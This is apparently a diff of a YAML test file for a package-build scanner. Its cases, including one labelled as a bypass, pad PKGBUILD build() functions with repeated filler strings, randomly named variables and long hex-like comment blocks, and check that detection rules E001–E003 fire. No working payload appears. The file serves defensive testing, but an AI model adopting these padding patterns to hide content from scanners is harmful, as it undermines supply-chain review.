+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  Ax7Bq3Kz=one\n+  Cd9Em4Lw=one\n+  Fg2Hn5Mv=one\n+  Jk6Pp8Rs=one\n+  Tu1Vw9Xy=one\n\
+    \ }\n package() {\n   true\n"
   expect_fire:
   - E001
   - E002
   - E003
 - id: E001-E003-bypass
-  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -6,7 +6,141 @@\n license=(\"MIT\")\n source=()\n build() {\n-  true\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
-    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
-    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
-    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
-    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n+  printf -v Ax7Bq3Kz '%s' one\n+  printf -v Cd9Em4Lw '%s' one\n+  printf -v Fg2Hn5Mv '%s' one\n+  printf -v Jk6Pp8Rs '%s' one\n+  printf -v Tu1Vw9Xy '%s' one\n+  # a5cd6 4d3c1 ca264 18b8f 25165 3031d bb3b9 1db20 6dece 1332a 2c014 de06c\n+  # d61aa 23c41 7b382 2e71e d95a9 1e43b 3f62f 724c6 1fac6\
-    \ cb19b 1963c 7131a\n+  # 17d9a 442f7 9447a d6996 49dbc 3c4f4 9df15 5c882 34c3b 6030a beaae 31e26\n+  # 2025e 1e840 69736 fe2a0 daed6 a0d7e ee635 e807c b9215 997b0 7f31c 5c0a6\n+  # 7cfa3 29e8e 99ba4 fd7fe afdc0 e5cd9 936c9 257a9 3c731 d6143 5475e af21f\n+  # 4dd0e fa595 d7e8d 1412f 27bdd a0a38 ae248 b34a9 fe4c2 e993b 2334e 2febd\n+  # 8a357 f2bd0 2147a 1f101 9e84d e42b0 91b68 c5867 b1aaa 0b8d5 ec635 b5ff6\n+  # 560a6 3bf3f fcc55 1e2f4 6fb8e 932a4 4238e 7ec75 cbb93 c82a8 fe362 2941f\n+  # 552df e5fbe cda45 8e40e 461b2 dc6d5 8e8d3 d4a1b b7b0d c2c93 76250 4d458\n+  # 2a7cf 5a393 4d76f 76c30 7777d 062d2 f84d0 5d5c0 8686b 90593 02188 4a961\n+  # d6802 bd0ec a3211 40406 1ba4f e9cd3 c8e5e cbcfc cc46f c9ca1 3502d f68a2\n+  # cd06d 1fdef 61979 227b6 6ae30 e199d 53196 38488 ae1b8 1aeb3 346b1 001e9\n+  # 4d729 33f32 ba2b1 0d0e7 24006 6a78c c0a12 4c0ec 8127e b1dd0 ba73a f2c3f\n+  # 3ee52 3b0f9 f9e40 ee962 f5f65 f7b92 9fab1 2bf91 49c9c 3451e af6df 878e3\n+  # f50de 52a81 0bd33 6911f b9379 4b0f7\
-    \ 0dd88 989f3 2e98e 85b0e bbc01 55868\n+  # b61dc 7211e a8c9d 72328 63ea2 7a910 cd268 74173 665ba fc4de b60c4 0ed67\n+  # 0e4dc 8f0ff f1c97 84b28 63256 b0459 e4fb0 b2f43 bab18 293c4 70e07 344df\n+  # 74252 f0ae5 64b6a acebe 68a3a f71e5 00fa2 f57d8 b021a 2b681 3d640 c6ee2\n+  # 660d3 f4c0b 5b673 de2b6 aa3fb 2c6a7 caab5 ed236 cd829 2b7a8 51559 570ab\n+  # 410b2 0e1ae 4d639 ee42d 4ad75 f2dee b3689 4fd3c 43105 0af48 074ad 349e8\n+  # 474bd de1c4 63bd8 6c0db 0e553 80f07 6cf17 95ffb 7b27f a6e81 84cb7 d688d\n+  # 431c1 1f2ee b5232 ea941 d75c9 42f36 4dbd7 0993a e1580 5dc05 02037 4cb2e\n+  # 583dd 487a6 f26da 3d9cc 1f9e6 a6e72 f7088 3653f 1d17d 7f3aa 61f2e 8dc81\n+  # 159b1 320ba e7839 0e446 2071e e2f17 a6b6d 66182 8deb4 e799d f4c12 7eccb\n+  # 84e94 67b9a e5226 46367 d5517 3e453 c8e3f e25d4 a1c81 2524c 7b350 db4f3\n+  # 25701 6ce5a 9b05f 3ea4a 4f13a bb7c6 49348 81975 46463 ef7b1 706dd 30313\n+  # cbe85 f97a3 5359e 728a6 52aba dcf06 cec02 ada0a d7b18 6438a b6963 a315c\n+  # 2f340 bb5e2 09f9a\
-    \ ad0ba ead6e e183b 09420 c4c8c a9ba1 9745c 20eab 39c77\n+  # 75050 35a5a 2b0a1 87f80 8b392 1444e 5cf44 8a77e 42551 d831b 84686 cfd86\n+  # 4c79f fd3dc a772e 2dcdf 8ee14 1d741 5ddf4 d9c32 25137 89b05 089e2 2d588\n+  # 85670 2ae04 71df7 221c5 87661 3e4c8 e8550 05e96 ada54 d5e4a 8924e 4229c\n+  # 161f0 7a144 380a0 52a97 86172 19cb5 5cbf2 674e2 9fbd7 9c29a 6967f 9475b\n+  # e4311 5b15b 8a81e b1aa1 094ca 803ad 12eb0 07db7 09702 61007 f313d 7dc9b\n+  # e4e47 366a8 dd466 fd70d c9429 9d95b 6e2c3 7589b af76f 65b21 47893 cf348\n+  # b1f25 1bd8d 42779 074c7 2435c 82dd3 dc8a0 53950 1c5d8 2b419 c302e 90598\n+  # 7c035 960bc 17295 eb3d6 5ee67 50a82 89bf2 e4431 01dad 86c7c ba70b a8690\n+  # a5a63 7d281 11a30 9e7d1 6f8c1 b6922 5daca 008c1 abb0b c3649 2af3b f3047\n+  # 8ecfc 66e6d 7f115 0288e 2e841 87411 2df42 49a8b cc8cb 15555 c9b79 0b845\n+  # 996b3 9bc5f 7732d 2b415 4f7d3 c76eb a6fb2 fd069 4c866 917f9 4a1cf 166b6\n+  # dbc5f 47535 083b9 75bac 2b912 0ff44 156ef 4424c b8aea 35b79 c0d41 e71c1\n+  #\
-    \ 19ffe 09a57 7d36e fa84c 870fd 01b26 e9f52 23e5a 2f130 21d15 f29d9 811f8\n+  # 261e4 87f73 7835d 69124 76230 ebb1b fce6d c3def 274a7 f540d 931b7 17ef4\n+  # 65864 27aa6 4b7b4 a9de2 82047 9bdc9 44526 06625 f6ffd 1f0ef f8ba8 899c9\n+  # 32f42 6f758 faaeb 94eb2 9232c ede84 ee8a2 eec40 3cac6 66041 9f93d 2bf51\n+  # f225d 08f65 9444f eafe3 27265 e61e6 898d7 c610f 6b6fc 6be20 2633a 2e3c3\n+  # 48923 860bd b8176 43e4c 8f238 39b0d baf9f 7677e feeb2 f8e76 c9c4e 0cb71\n+  # 51710 01d69 fbbf9 e6ca0 cf931 9a995 480ac d515b b01b8 c090f a1d4f 3de7d\n+  # a9a35 00e43 a62b1 ad321 cbe8a 3d760 64382 06006 9464f 81a50 be93e 2144b\n+  # c92a1 c7c33 271df b8aee db29b 8ce12 18b69 8fafb 34135 1a6d9 923d3 4c3e8\n+  # 7fa77 880d8 df5af a1968 6133e bf27a db01b 0eda9 ccd24 6828b 29416 1954e\n+  # d25fa e6d72 46f2f 9289e f89d4 19138 412ef 576e3 f1c21 d4696 aff49 90410\n+  # 98758 82f0b 8534e cffaa 7a324 9a073 f763a c9ea9 3d4ee 55ac9 52c4b 267cc\n+  # 6a6e4 fe80b 70a72 e7edc aa694 e6613 dad73 47792 62832 7cf8c\
-    \ 2e722 5971a\n+  # af14c 2ea3e a379a 7a6ec bc928 84477 677f2 0a482 d3581 c4035 d3e88 6b85c\n+  # c0f48 8a5ce ad28f 1fc64 ff0cf 8e169 b864f 40728 6e92b 2f690 8ac33 7f355\n+  # c4e52 ccacf e4478 dd19b 9fc09 0b2ab 41268 10823 d9b3c f2503 faca4 00176\n+  # 25725 c8757 efb18 e5dcd 7f36d 37d4e 7295f 4f0aa 4ddbe 37c07 ea268 2b859\n+  # 143f6 00b30 40556 77144 133f3 9b895 4184d 80eb2 dff6e 39697 32ea6 24052\n+  # 99c76 6226b c6b2a 85924 72797 0096f 055b3 9a60f ebdfa 8ea52 a1f98 7c164\n+  # f35b1 78338 7e7e6 0efde d2d8c 9d633 1c516 0b27b 63631 ff228 d70c5 2984e\n+  # 83b71 74a78 d940c bd8d3 741d4 fc631 11753 ad151 d7533 b981f caef7 656ab\n+  # 03753 958f9 22868 69126 fdcbd 669ca 9f993 634b3 762c9 ee236 7160f 87b0f\n+  # 97017 37cfe fdd4d 5fe78 72578 f858d d584d 1ce2b 4af2b c9739 1bd4d 6d07a\n+  # 0c191 48a89 d4ad5 1a8ad 1eca0 5e42f c9617 e6377 a0ded 39f61 28a20 54cdf\n+  # a8928 61a14 5efb7 ef6b5 10545 9fa7c c1da6 bf6da a9d44 e286d 56a95 37c94\n+  # 01784 280f5 8f42c 2959c b3f37 d7223 3f56b\
-    \ 6a30a c2a05 b6981 9e0dd dd69f\n+  # 2ceee 19384 f269e 6434d bed46 e487a 62d45 a588c ba7ed f2f62 0f812 d2549\n+  # 7efb9 cf3e5 14d00 c04a6 11d86 ed980 200a7 1fbef 83979 63cf5 202e1 ad9a8\n+  # b9d7c 8b6cd ab814 1650d 863b7 a20a2 8d1f6 98459 01ee5 21733 0c6b5 77bd5\n+  # 36eaf f34bf ee75f c5e54 80893 dc20d fca89 43f23 fe3a9 5daa3 04750 9b4c1\n }\n package() {\n   true\n"
+  diff: "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -6,7 +6,141 @@\n license=(\"MIT\")\n source=()\n\
+    \ build() {\n-  true\n+  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
+    +  _b='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n\
